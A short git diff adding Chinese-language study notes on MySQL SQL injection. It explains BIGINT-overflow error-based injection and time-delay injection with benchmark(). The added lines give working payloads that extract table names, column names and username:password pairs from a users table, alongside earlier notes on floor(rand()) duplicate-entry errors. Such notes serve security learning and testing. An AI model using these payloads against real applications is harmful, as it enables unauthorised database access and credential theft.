@@ -92,5 +92,11 @@ duplicate entry重复的条目
 如何floor联合报错的：进行group by floor(rand(0)*2),floor表达式第一次运算的值为0，在插入的过程中需要再取一次group by后面的值，取到1并插入 注意：语法顺序
 double数值类型溢出原理
 %2b=+,exp与in和log的功能相反，指数函数为对数函数的反函数，exp()即为e为底的对数函数
-
+bigint溢出错误的sql注入，利用其溢出，从而设法提取数据，如果一个查询成功返回，其返回值为0，对逻辑非得话为1
+select(select *from (select user())x)返回root@localhost ,!(select*from(select user())x)返回1
+获取表名：!(select*from(select table_name from information_schema.tables where tables_schema=database()limit 0,1)x)-~0
+获取列名：!(select*from(select column_name from information_schema.columns where table_schema='users'limit 0,1)x)-~0;
+检索数据:!(select*from(select concat_ws(':',username,password)from users limit 0,1)x)-~0
+延时注入：benchmark()重复执行某表达式
+select benchmark(count,expr)是重复执行count次expr表达式，使得处理的时间很长
  
